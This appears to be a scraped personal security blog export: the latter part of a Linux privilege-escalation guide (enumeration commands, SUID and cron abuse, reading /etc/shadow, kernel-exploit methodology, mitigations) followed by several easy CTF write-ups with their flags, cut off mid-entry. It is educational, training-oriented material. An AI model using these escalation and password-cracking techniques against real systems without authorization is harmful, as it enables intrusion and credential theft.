escalation: which is more common. In this case, the attacker gains access to another user on the system with higher privileges than their initial compromised account. With elevated privileges, an attacker can move through the network undetected. How privileges are created and delegated in Linux systems The /etc/passwd, is one of the most critical files on a Linux system. This file contains a list of all the users known to the system, including those included in directory services.\nTo view the contents of the passwd file, the \u0026ldquo;cat\u0026rdquo; command can be used. The output of the command provides information about each user, including their username, encrypted password, user ID, group ID, home directory, and default shell.\n┌──(kali㉿iasad)-[~] └─$ cat /etc/passwd root❌0:0:root:/root:/usr/bin/zsh daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/run/ircd:/usr/sbin/nologin _apt❌42:65534::/nonexistent:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin geoclue❌118:125::/var/lib/geoclue:/usr/sbin/nologin Debian-snmp❌119:126::/var/lib/snmp:/bin/false sslh❌120:128::/nonexistent:/usr/sbin/nologin ntpsec❌121:131::/nonexistent:/usr/sbin/nologin redsocks❌122:132::/var/run/redsocks:/usr/sbin/nologin rwhod❌123:65534::/var/spool/rwho:/usr/sbin/nologin iodine❌124:65534::/run/iodine:/usr/sbin/nologin miredo❌125:65534::/var/run/miredo:/usr/sbin/nologin statd❌126:65534::/var/lib/nfs:/usr/sbin/nologin redis❌127:133::/var/lib/redis:/usr/sbin/nologin postgres❌128:134:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash mosquitto❌129:136::/var/lib/mosquitto:/usr/sbin/nologin inetsim❌130:137::/var/lib/inetsim:/usr/sbin/nologin _gvm❌131:139::/var/lib/openvas:/usr/sbin/nologin king-phisher❌132:140::/var/lib/king-phisher:/usr/sbin/nologin kali❌1000:1000:,,,:/home/kali:/usr/bin/zsh asad❌1001:1001:Asad Ullah,,,:/home/asad:/bin/bash Each line represents a user on the Linux system. and each field is separated using the colon “:” character in which the fields represent the following passwd file format:\nUsername Password Placeholder - x indicates encrypted password in /etc/shadow User ID (UID) Group ID (GID) Personal Information (separated by comma’s) Home Directory Shell – absolute path to the command shell used On Linux and Unix operating systems, any user with a user ID above 1000 is considered a non-default user and has been added to the system. However, the threshold may vary slightly depending on the specific operating system. The user ID \u0026ldquo;0\u0026rdquo; is reserved for the root account, which grants super-user privileges. Other users can also be assigned \u0026ldquo;UID 0\u0026rdquo; to give them similar privileges. Predefined accounts are assigned \u0026ldquo;Effective ID 0\u0026rdquo; and IDs ranging from 1 to 99. The range of IDs from 100 to 999 is reserved for system administration.\nIn some cases, you might find a \u0026ldquo;+\u0026rdquo; or \u0026ldquo;-\u0026rdquo; symbol in the UID field. This usually represents an account being used with a directory service, such as LDAP.\nIn older Linux systems, the password of the user was stored in the /etc/passwd file. However, this was deemed insecure, and a more secure method was introduced where passwords are stored in the /etc/shadow file. If the password placeholder field contains an \u0026ldquo;x,\u0026rdquo; it means the password is stored in the /etc/shadow file instead of /etc/passwd.\nWhy do we need to perform privilege escalation? To gain read/write access to sensitive files that are otherwise restricted from the user. To persist through reboots, making it easier for the attacker to maintain access to the system for an extended period of time. To insert a permanent backdoor that allows the attacker to regain access to the system even if they are kicked out by system administrators or security teams. Privilege escalation techniques To focus on privileged accounts, cyber attackers follow established methods and techniques to detect system misconfigurations, vulnerabilities, users with excessive privileges, and vulnerable credentials.\nEnumeration Enumeration is a crucial first step to take after gaining access to any system. Whether you obtained root-level access by exploiting a critical vulnerability or simply found a way to execute commands through a low privileged account, the penetration testing process doesn\u0026rsquo;t stop at gaining access to a specific system or user privilege level. In fact, as you will discover, enumeration is just as vital during the post-compromise phase as it is before.\nhostname: returns the hostname of the target machine. uname -a: prints system information, including the kernel version. /proc/version: provides information about the target system processes, including the kernel version and installed compilers. /etc/issue: contains information about the operating system but can be customized or changed. ps: shows the running processes on a Linux system. more on \u0026#39;ps\u0026#39; The ps command is an effective way to see the running processes on a Linux system.\nThe output of the ps (Process Status) will show the following;\nPID: The process ID (unique to the process) TTY: Terminal type used by the user Time: Amount of CPU time used by the process (this is NOT the time this process has been running for) CMD: The command or executable running (will NOT display any command line parameter) The “ps” command provides a few useful options.\nps -A: View all running processes ps axjf: View process tree (see the tree formation until ps axjf is run below) ps aux: The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities. env: shows environmental variables, including the PATH variable. more on \u0026#39;env\u0026#39; The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation. sudo -l:The target system may be configured to allow users to run some (or all) commands with root privileges. The sudo -l command can be used to list all commands your user can run using sudo.\nls -la: lists all files in a directory, including hidden files.\nid: provides an overview of the user\u0026rsquo;s privilege level and group memberships.\n/etc/passwd: lists users on the system. grep home to see only real users\n┌──(kali㉿iasad)-[~] └─$ cat /etc/passwd | grep home kali❌1000:1000:,,,:/home/kali:/usr/bin/zsh asad❌1001:1001:Asad Ullah,,,:/home/asad:/bin/bash history: shows earlier commands executed on the target system. Looking at earlier commands with the history command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.\nifconfig: gives information about the network interfaces of the system.\nip route command to see which network routes exist.\nnetstat: gathers information on existing connections, including listening ports, established connections, and network usage statistics.\nmore on \u0026#39;netstat\u0026#39; netstat -a: shows all listening ports and established connections. netstat -at: lists all TCP connections. netstat -au: lists all UDP connections. netstat -l: lists ports in \u0026ldquo;listening\u0026rdquo; mode. netstat -s: lists network usage statistics by protocol. netstat -tp: lists connections with service name and PID information. netstat -i: shows interface statistics. netstat -ano: lists all active connections with PID and process information. find: Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal. Some useful examples for the \u0026#39;find\u0026#39; command.\rfind . -name flag.txt: find the file named “flag.txt” in the current directory\nfind /home -name flag.txt: find the file names “flag.txt” in the /home directory\nfind / -type d -name config: find the directory named config under “/”\nfind / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and- executable by all users)\nfind / -perm a=x: find executable files\nfind /home -user frank: find all files for user “frank” under “/home”\nfind / -mtime 10: find files that were modified in the last 10 days\nfind / -atime 10: find files that were accessed in the last 10 day\nfind / -cmin -60: find files changed within the last hour (60 minutes)\nfind / -amin -60: find files accesses within the last hour (60 minutes)\nfind / -size 50M: find files with a 50 MB size\nFolders and files that can be written to or executed from:\nfind / -writable -type d 2\u0026gt;/dev/null : Find world-writeable folders\nfind / -perm -222 -type d 2\u0026gt;/dev/null: Find world-writeable folders\nfind / -perm -o w -type d 2\u0026gt;/dev/null: Find world-writeable folders\nFind development tools and supported languages:\nfind / -name perl*\nfind / -name python*\nfind / -name gcc*\nIt is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with -type f 2\u0026gt;/dev/null to redirect errors to “/dev/null” and have a cleaner output (below).\n┌──(kali㉿iasad)-[~] └─$ find / -size +100M -type f 2\u0026gt;/dev/null /home/kali/.BurpSuite/burpbrowser/110.0.5481.77/chrome /home/kali/.local/share/Trash/files/combination.txt /home/kali/CTFs/tryhackme/rockyou.txt /proc/kcore /usr/lib/x86_64-linux-gnu/libLLVM-15.so.1 Automated Enumeration Tools During the enumeration phase of privilege escalation, it’s common for attackers to search for all the possible ways to elevate privileges by checking out the detailed version and configuration of the Linux system.\nSome common commands used during the enumeration phase are the following:\nEnumeration Commands Description id print real and effective user and group IDs whoami current user hostname show or set the system\u0026rsquo;s host name uname print system information ps -ef report a snapshot of the current processes echo $PATH print environment PATH variable ifconfig configure a network interface cat /etc/passwd show passwd file contents sudo -l list commands allowed using sudo find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2\u0026gt; /dev/null Find all files suid and sgid files Commonly Used Privilege Escalation Tools: LinPEAS - Linux Privilege Escalation Awesome Script LinEnum - Linux Enumeration Script Linux Priv Checker Linux Exploit Suggester 2 Linux Smart Enumeration LinPEAS - Linux Privilege Escalation Awesome Script LinPEAS is a script designed to detect potential pathways for privilege escalation on hosts operating on Linux, Unix, or MacOS. The primary function of the script is to identify vulnerabilities in the system that can be exploited to elevate user privileges. It searches for common misconfigurations and weak permissions in files and directories that can be leveraged for privilege escalation. LinPEAS can enumerate running processes, open network ports, and installed software to detect vulnerabilities that can be exploited. Github: LinPEAS\rLinEnum - Linux Enumeration Script This is an awesome Linux enumeration script. It’s run on the target host and searches for many of the common privilege escalation methods or misconfigurations.\nSome of the enumeration information collected includes:\nKernel and distribution release details System information User information Privileged access Environmental information Github: LinEnum\rLinux Priv Checker Originally forked from the linuxprivchecker.py (Mike Czumak), this script is intended to be executed locally on a Linux box to enumerate basic system info and search for common privilege escalation vectors such as word writable files, misconfigurations, clear-text password and applicable exploits.****\nGithub: Linux Priv Checker\rLinux Exploit Suggester 2 This next-generation exploit suggester is based on Linux_Exploit_Suggester.\nKey improvements include:\nMore exploits! Option to download exploit code directly from Exploit DB Accurate wildcard matching. This expands the scope of searchable exploits. Output colorization for easy viewing. And more to come! This script is extremely useful for quickly finding privilege escalation vulnerabilities both in on-site and exam environments.\nGithub: Linux Exploit Suggester 2\rLinux Smart Enumeration Linux enumeration tools for pentesting and CTFs. This project was inspired by LinEnum and uses many of its tests. Unlike LinEnum, lse tries to gradualy expose the information depending on its importance from a privesc point of view.\nGithub: Linux Smart Enumeration\rCommon Privilege Escalation Techniques Privilege Escalation: Kernel Exploits Privilege Escalation: Abusing sudo-rights Privilege Escalation: SUID Privilege Escalation: Capabilities Privilege Escalation: Weak/reused/plaintext passwords Privilege Escalation: Cron Jobs Privilege Escalation: PATH Privilege Escalation: NFS Privilege Escalation: Kernel Exploits Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.\nUnless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.\nThe kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.\nThe Kernel exploit methodology is simple;\nIdentify the kernel version Search and find an exploit code for the kernel version of the target system Run the exploit Research sources:\nBased on your findings, you can use Google to search for an existing exploit code. Sources such as linuxkernelcves\rcan also be useful. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable). Hints/Notes:\nBeing too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code. You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and wget respectively. Privilege Escalation: Abusing sudo-rights If a user is part of the sudoers file and is permitted to execute certain binaries or executables using sudo, then in many situations it might be possible to abuse the sudo permissions and gain access to root. Gtfobins\ris an excellent resource to look for ways to bypass security restrictions on misconfigured systems\nAny user can check its current situation related to root privileges using this command sudo -l.\nLeverage application functions\nSome applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.\nIn this case, we can use a \u0026ldquo;hack\u0026rdquo; to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile).\nLoading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file.\nLeverage LD_PRELOAD\nOn some systems, you may see the LD_PRELOAD environment option.\nLD_PRELOAD is a function that allows any program to use shared libraries.\nPrivilege Escalation: SUID Linux privilege controls heavily rely on managing the interactions between users and files through the use of permissions. As you may already be aware, permissions grant users the ability to read, write, and execute files based on their assigned privilege levels. However, the concept of permissions expands to include SUID (Set-user Identification) and SGID (Set-group Identification), which allow files to be executed with the permission level of either the file owner or the group owner, respectively.\nYou will notice these files have an “s” bit set showing their special permission level.\nfind / -type f -perm -04000 -ls 2\u0026gt;/dev/null will list files that have SUID or SGID bits set.\n┌──(kali㉿iasad)-[~/CTFs/tryhackme/PrevEsc] └─$ find / -type f -perm -04000 -ls 2\u0026gt;/dev/null 3322006 640 -rwsr-xr-x 1 root root 653888 Feb 8 05:43 /usr/lib/openssh/ssh-keysign 3321238 16 -rwsr-sr-x 1 root root 14672 Feb 7 08:15 /usr/lib/xorg/Xorg.wrap 3551549 52 -rwsr-xr-- 1 root messagebus 51272 Feb 8 08:21 /usr/lib/dbus-1.0/dbus-daemon-launch-helper 3321635 20 -rwsr-xr-x 1 root root 18664 Feb 12 22:15 /usr/lib/polkit-1/polkit-agent-helper-1 3833220 36 -rwsr-xr-x 1 root root 35128 Mar 23 06:02 /usr/bin/umount 3835221 68 -rwsr-xr-x 1 root root 68248 Mar 23 08:40 /usr/bin/passwd 3833658 144 -rwsr-xr-- 1 root kismet 146216 Dec 27 10:04 /usr/bin/kismet_cap_nrf_mousejack 3835712 140 -rwsr-xr-- 1 root kismet 142120 Dec 27 10:04 /usr/bin/kismet_cap_nrf_52840 3835384 144 -rwsr-xr-- 1 root kismet 146216 Dec 27 10:04 /usr/bin/kismet_cap_nxp_kw41z 3833714 212 -rwsr-xr-- 1 root kismet 216392 Dec 27 10:04 /usr/bin/kismet_cap_linux_wifi 3833495 144 -rwsr-xr-- 1 root kismet 146216 Dec 27 10:04 /usr/bin/kismet_cap_rz_killerbee 3833215 60 -rwsr-xr-x 1 root root 59704 Mar 23 06:02 /usr/bin/mount 3834888 276 -rwsr-xr-x 1 root root 281624 Mar 8 15:17 /usr/bin/sudo 3834378 140 -rwsr-xr-- 1 root kismet 142120 Dec 27 10:04 /usr/bin/kismet_cap_nrf_51822 3833815 160 -rwsr-xr-x 1 root root 162752 Mar 23 06:18 /usr/bin/ntfs-3g 3834280 140 -rwsr-xr-- 1 root kismet 142120 Dec 27 10:04 /usr/bin/kismet_cap_ubertooth_one 3835318 144 -rwsr-xr-- 1 root kismet 146216 Dec 27 10:04 /usr/bin/kismet_cap_ti_cc_2531 3833996 48 -rwsr-xr-x 1 root root 48896 Mar 23 08:40 /usr/bin/newgrp 3841548 16 -rwsr-xr-x 1 root root 14888 Jan 3 06:19 /usr/bin/vmware-user-suid-wrapper 3834858 64 -rwsr-xr-x 1 root root 62672 Mar 23 08:40 /usr/bin/chfn 3833406 36 -rwsr-xr-x 1 root root 35128 Feb 18 01:22 /usr/bin/fusermount3 3834746 144 -rwsr-xr-- 1 root kismet 146216 Dec 27 10:04 /usr/bin/kismet_cap_ti_cc_2540 3833367 32 -rwsr-xr-x 1 root root 30872 Feb 12 22:15 /usr/bin/pkexec 3835169 88 -rwsr-xr-x 1 root root 88496 Mar 23 08:40 /usr/bin/gpasswd 3834276 152 -rwsr-xr-- 1 root kismet 154408 Dec 27 10:04 /usr/bin/kismet_cap_linux_bluetooth 3835510 72 -rwsr-xr-x 1 root root 72000 Mar 23 06:02 /usr/bin/su A good practice would be to compare executables on this list with GTFOBins\rClicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set you can also use this link for a pre-filtered list GTFOBins\r.\nThe list above shows that nano has the SUID bit set. Unfortunately, GTFObins does not provide us with an easy win. Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.\nThe SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the /etc/shadow file or adding our user to /etc/passwd\nPrivilege Escalation: Capabilities System administrators have an additional method to elevate the privilege level of a process or binary, known as \u0026ldquo;Capabilities\u0026rdquo;. Capabilities offer a more fine-grained approach to managing privileges. For instance, if a SOC analyst requires a tool that requires socket connections, but does not have higher privileges, the system administrator can modify the capabilities of the binary instead of granting the user elevated privileges. This allows the binary to perform its task without requiring a user with higher privileges. This way, system administrators can maintain a higher level of security by limiting privileges to only the necessary actions, reducing the risk of unauthorized access or misuse of privileges. Overall, capabilities provide a more nuanced and flexible approach to privilege management in Linux systems.\nWhen run as an unprivileged user, getcap -r /will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.\nGTFOBins\rhas a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.\nPrivilege Escalation: Weak/reused/plaintext passwords It is common to come across weak or commonly reused passwords in Linux systems and applications when users create their passwords. For instance, if you discover a password being used for a web application, you may also find that the same password is used for the user account or even the root user. Conducting a search through common configuration files, such as config.php, or examining a user\u0026rsquo;s command history may reveal some interesting methods for elevating privileges.\nPrivilege Escalation: Cron Jobs Cron jobs are a useful tool to automate the execution of scripts or binaries at specific times. By default, they run with the permissions of their owners rather than the current user. Although properly configured cron jobs are generally secure, they can pose a privilege escalation risk under certain circumstances.\nEssentially, if a scheduled task is set to run with root privileges and we can modify the script that it will execute, then our script will also run with root privileges.\nCron job configurations are saved as crontabs, which enable users to see when tasks are scheduled to run. Each user on the system has their own crontab file and can set up specific tasks to run, even if they are not logged in. Our objective will be to identify a cron job that is set up by root and modify it so that it runs our shell script.\nThe system-wide cron job file, which contains all of the system-wide cron jobs, can be accessed and read by any user at /etc/crontab.\nPrivilege Escalation: PATH If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable were are talking about here, path is the location of a file).\nTypically the PATH will look like this:\nPrivilege Escalation: NFS Privilege escalation vectors are not limited to internal access alone. Shared folders and remote management interfaces such as SSH and Telnet can also aid in obtaining root access on the target system. In certain cases, both vectors may need to be utilized, for instance, by discovering a root SSH private key on the target system and connecting through SSH with root privileges instead of attempting to elevate the privileges of the current user.\nAnother vector that is particularly relevant to CTFs and exams involves a misconfigured network shell. This vector can occasionally be observed during penetration testing engagements when a network backup system is in place.\nThe NFS (Network File Sharing) configuration is stored in the /etc/exports file. This file is generated during the installation of the NFS server and can usually be accessed by users.\nReal-World Examples of Privilege Escalation Recent Linux Kernel exploits, such as Dirty c0w and Nelson (Full Nelson and Half Nelson), can allow an unprivileged user to gain root access. Dirty c0w is a vulnerability that affected many Linux Kernels prior to 2018, exploiting a race condition within the memory management system\u0026rsquo;s copy-on-write mechanism. This vulnerability can be used to overwrite sensitive files like /etc/passwd. There are several variations of the Dirty c0w exploit, each using the same vulnerability but with slightly different elevation techniques. It\u0026rsquo;s crucial to verify the system architecture on the target system in this case.\nAnother exploit, Full Nelson (also known as Half Nelson), is a local privilege escalation technique and an older one. This technique can still be used to gain root access on many unpatched systems. These three vulnerabilities were discovered by the same researcher.\nAn example of the Dirty c0w vulnerability being used is as follows:\nMitigating Privilege Escalation Mitigating privilege escalation refers to the strategies and best practices that can be used to prevent or minimize the impact of privilege escalation attacks on Linux systems. This involves implementing security measures to make it more difficult for attackers to elevate their privileges.\nTips for preventing privilege escalation Regularly update your systems and applications: One of the most important steps to prevent privilege escalation attacks is to keep your systems and applications up-to-date. Regularly applying security patches and updates can help prevent attackers from exploiting known vulnerabilities. Implement the principle of least privilege: This principle suggests that each user or process should have only the minimum permissions necessary to perform its intended function. This limits the potential damage that can be caused by an attacker who gains access to a user or process with elevated privileges. Use strong authentication and access controls: Passwords alone are not enough to secure critical systems or applications. Use strong authentication methods, such as two-factor authentication (2FA) or multi-factor authentication (MFA), and implement access controls to ensure that only authorized users can access sensitive data or resources. Regularly audit and monitor your systems: Keep an eye on your systems and regularly review logs to detect any suspicious activity. This will help you quickly identify and respond to potential threats, including privilege escalation attacks. Secure your sensitive data: Make sure that sensitive data, such as user credentials or personal information, is stored securely and encrypted when transmitted over the network. Best practices for system security Regularly backup your data: Regular backups of your data can help ensure that you can quickly recover from any security incidents, including privilege escalation attacks. Use a firewall: Implement a firewall to control incoming and outgoing traffic to your network. This can help prevent unauthorized access to your systems and data. Limit network exposure: Reduce the number of services and ports exposed to the network. This will limit the potential attack surface for attackers. Use secure protocols: Use secure communication protocols, such as SSL/TLS, to encrypt sensitive data transmitted over the network. Implement security policies and procedures: Establish and enforce security policies and procedures to ensure that all users understand their responsibilities and follow best practices for security. Train employees on security best practices: Provide regular training and education to all employees on security best practices, including how to identify and report potential security threats. By following these tips and best practices, you can help prevent privilege escalation attacks and maintain the security of your Linux systems.\nConclusion In conclusion, privilege escalation is a serious security threat that should not be taken lightly. By implementing the best practices and understanding the techniques used by cybercriminals, organizations can significantly reduce the risk of privilege escalation and maintain the security of their Linux systems.\nSummary of Key Points: Privilege escalation is a technique used by cybercriminals to gain higher levels of access to a system or network. This can be done through various methods such as exploiting kernel vulnerabilities, weak passwords, configuration errors, weak file permissions, or exploiting SUID binaries.\nThere are two types of privilege escalation - vertical and horizontal. Vertical privilege escalation involves gaining higher levels of access to a system, while horizontal privilege escalation involves gaining access to other accounts with the same level of privilege.\nIt is crucial to understand the importance of privilege escalation for penetration testing and system security. By understanding how cybercriminals can escalate their privileges, security professionals can implement the necessary security measures to protect their systems and networks.\nTo mitigate privilege escalation, it is recommended to implement best practices such as moving passwords into the background using an enterprise password manager or PAM solution, practicing the Principle of Least Privilege, implementing Multi-Factor Authentication, patching and updating systems and applications, and auditing and logging all privilege access usage.\nFinal Thoughts: Privilege escalation is a critical aspect of Linux system security that should not be overlooked. As cyber threats continue to evolve and become more sophisticated, it\u0026rsquo;s essential to have strong security measures in place to prevent attackers from exploiting vulnerabilities and escalating their privileges.\nBy implementing the best practices we discussed in this blog post, you can harden your Linux systems and make privilege escalation exploits harder for attackers. With regular updates and audits, you can stay ahead of potential threats and keep your systems secure.\nRemember, prevention is always better than reaction when it comes to cybersecurity. Take action today to protect your Linux systems from privilege escalation and ensure the safety and security of your organization\u0026rsquo;s sensitive data.\n","permalink":"https://iasad.me/blogs/linux-privilege-escalation/","summary":"A comprehensive guide covering Linux privilege escalation, from privilege creation to exploitation (including both manual enumeration and automated tools), as well as prevention tips.","title":"A Guide On Linux Privilege Escalation - The Journey Towards System Control"},{"content":"\rInfo\rName: The Sender Conundrum\rDifficulty: Easy\rPoints: 200\rCategory: Forensics\rDescription Marcus Got a Mysterious mail promising a flag if he could crack the password to the file.\nDownload Attachments: TheEmail.eml\runzipme.zip\rApproach we were given two files unzipme.zip that require password and an TheEmail.eml which include a hint for the zip password in the form of a riddle\n\u0026lt;p\u0026gt;\u0026lt;/p\u0026gt;Hello Marcus Cooper,\u0026lt;br\u0026gt; You are one step behind from finding your flag. \u0026lt;br\u0026gt; Here is a Riddle: \u0026lt;br\u0026gt; I am a noun and not a verb or an adverb.\u0026lt;br\u0026gt; I am given to you at birth and never taken away,\u0026lt;br\u0026gt; You keep me until you die, come what may.\u0026lt;br\u0026gt; What am I?\u0026lt;br\u0026gt; My guessing was it is either ( name, soul, spirit, identity, breath, life ) or a name of person. I tried all these but nothing worked. I even tried to brute force it with top_1000_usa_malenames_english.txt which is well known for username enumeration but no success.\nthen i tried to bruteforce it with rockyou.txt and it worked.\n┌──(kali㉿iasad)-[~/CTFs/VishwaCTF] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status BrandonLee (unzipme.zip/unzipme/flag.txt) 1g 0:00:00:02 DONE (2023-04-02 09:08) 0.3921g/s 4452Kp/s 4452Kc/s 4452KC/s Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. The flag was in plaintext after unzipping the \u0026ldquo;unzipme.zip\u0026rdquo; file using the password “BrandonLee”\nFlag: vishwaCTF{1d3n7i7y_7h3f7_is_n0t_4_j0k3}\nMy Thoughts I feel somewhat let down by this challenge because the riddle hinted that the password might be a name, which turned out to be true. However, the password wasn\u0026rsquo;t found in any of the popular name wordlists, such as top_1000_usa_malenames_english.txt 🔗 or names.txt 🔗 which I attempted to brute-force using the John, with no success. Frankly, it never occurred to me to use the rockyou.txt list for brute-forcing a name. this took up a lot of time 😿\n","permalink":"https://iasad.me/write-ups/ctftime/vishwactf/the-sender-conundrum/","summary":"A write-up on forenics challenge The Sender Conundrum.","title":"The Sender Conundrum - VishwaCTF"},{"content":"\rInfo\rName: Gautemala\rDifficulty: Easy\rPoints: 200\rCategory: steganography\rDescription My friend wanted to install an antivirus for his computer, but the creator of the antivirus was caught! Download Attachments: AV.gif\rApproach Got no success with tools such as strings, binwalk, and stegsolve, I decided to inspect the metadata using exiftool, where I found this.\n┌──(kali㉿iasad)-[~/CTFs/VishwaCTF] └─$ exiftool AV.gif ExifTool Version Number : 12.57 File Name : AV.gif Directory : . File Size : 1112 kB File Modification Date/Time : 2023:03:31 07:10:45-04:00 File Access Date/Time : 2023:04:02 09:04:34-04:00 File Inode Change Date/Time : 2023:03:31 07:10:52-04:00 File Permissions : -rw-r--r-- File Type : GIF File Type Extension : gif MIME Type : image/gif GIF Version : 89a Image Width : 498 Image Height : 498 Has Color Map : Yes Color Resolution Depth : 8 Bits Per Pixel : 8 Background Color : 0 Animation Iterations : Infinite Comment : dmlzaHdhQ1RGe3ByMDczYzdfdXJfM1gxRn0= Frame Count : 17 Duration : 2.04 s Image Size : 498x498 Megapixels : 0.248 Decoded the base64 and got the flag\n┌──(kali㉿iasad)-[~/CTFs/VishwaCTF] └─$ echo \u0026#34;dmlzaHdhQ1RGe3ByMDczYzdfdXJfM1gxRn0=\u0026#34; | base64 -d vishwaCTF{pr073c7_ur_3X1F} Flag: vishwaCTF{pr073c7_ur_3X1F}\n","permalink":"https://iasad.me/write-ups/ctftime/vishwactf/gautemala/","summary":"A write-up on stegonograpy challenge Gautemala.","title":"Gautemala - VishwaCTF"},{"content":"\rInfo\rName: Can You See Me\rDifficulty: Easy\rPoints: 100\rCategory: steganography\rDescription A magician made the seven wonders disappear. But people claim they can still feel their presence in the air.\nDownload Attachments: havealook.jpg\rApproach First, I checked filetype using file command. Then, I used exiftool to examine the metadata, but nothing interesting was there. Next, I used binwalk to search for any embedded files, and discovered an audio file. I extracted it using the command binwalk --dd=\u0026quot;.*\u0026quot;.\n┌──(kali㉿iasad)-[~/CTFs/VishwaCTF] └─$ binwalk --dd=\u0026#34;.*\u0026#34; havealook.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 134855 0x20EC7 Zip archive data, uncompressed size: 219888 323796 0x4F0D4 name: hereissomething.wav The audio sounded like random noise. However, since it was a steganography challenge, I suspected that there might be a hidden message in the audio. I opened the file in Sonic Visualizer and added a spectrogram layer, which is commonly used for hiding text in audio files. To do this, go to \u0026ldquo;Pane\u0026rdquo; menu and select \u0026ldquo;Add Spectrogram\u0026rdquo;. As expected, the flag was hidden in the audio file in plaintext and became visible in the spectrogram layer.\nFlag: VishwaCTF{n0w_y0u_533_m3}\n","permalink":"https://iasad.me/write-ups/ctftime/vishwactf/can-you-see-me/","summary":"A write-up on stegonograpy challenge Can You See Me.","title":"Can You See Me - VishwaCTF"},{"content":"\rInfo\rName: The Indecipherable Cipher\rDifficulty: Medium\rPoints: 300\rCategory: Cryptography\rDescription Our crypto specialist Mr.Kasiski is currently unavailable, so help us decode this string➡️j3qrh4kgz3iptmyqxcw0zkm8i5xugs5lwl0lrwvirwktlqinexcw0zkmq5nqvpebpor5wqipqhw2ikzm4ipktzlr\nApproach The first step I took was to identify the encryption type. To achieve this, I used Cipher Identifier\rwhich provided me with a list of possible encryptions\nAt first, I attempted to use base32, but it didn\u0026rsquo;t work. So, I tried the second-best option, the Vigenere cipher. Initially, it didn\u0026rsquo;t give me the flag, but then I noticed that the ciphertext also included numbers. So I decided to include numbers in the alphabet set.\nwhich resulted in this\nI thought that the text was still random, but the word \u0026ldquo;Friedrich\u0026rdquo; caught my attention. Therefore, I proceeded to separate each word in order to understand it.\n\u0026ldquo;Friedrich Wilhelm Kasiski was the person who designed the AAA Kasiski Examination to decode Vigenere cipher.”\nHowever, the flag that was accepted was actually the original plaintext.\nFlag: VishwaCTF{friedrichwilhelmkasiskiwastheonewhodesignedtheaaakasiskiexaminationtodecodevignerecipher}\n","permalink":"https://iasad.me/write-ups/ctftime/vishwactf/the-indecipherable-cipher/","summary":"A write-up on cryptography challenge the indecipherable cipher.","title":"The Indecipherable Cipher - VishwaCTF"},{"content":" Hide to See - 100 pts Description How about some hide and seek heh?Look at this image here\r.\nApproach The image hinted at the Albash cipher, but I didn\u0026rsquo;t found any encrypted data. After examining the metadata and trying different steganography tools, I eventually discovered the encrypted data hidden within the image using steghide.\n┌──(kali㉿iasad)-[~/CTFs/PicoCTF] └─$ steghide extract -sf atbash.jpg Enter passphrase: wrote extracted data to \u0026#34;encrypted.txt\u0026#34;. ┌──(kali㉿iasad)-[~/CTFs/PicoCTF] └─$ cat encrypted.txt krxlXGU{zgyzhs_xizxp_1u84w779} decoded it on Atbash Cipher\rand got the flag\nFlag: picoCTF{atbash_crack_1f84d779}\nReadMyCert - 100 pts Description How about we take you on an adventure on exploring certificate signing requests\nTake a look at this CSR file here\nHint💡\nDownload the certificate signing request and try to read it.\nApproach Dumping the contents of the readmycert.cer file reveals:\n-----BEGIN CERTIFICATE REQUEST----- 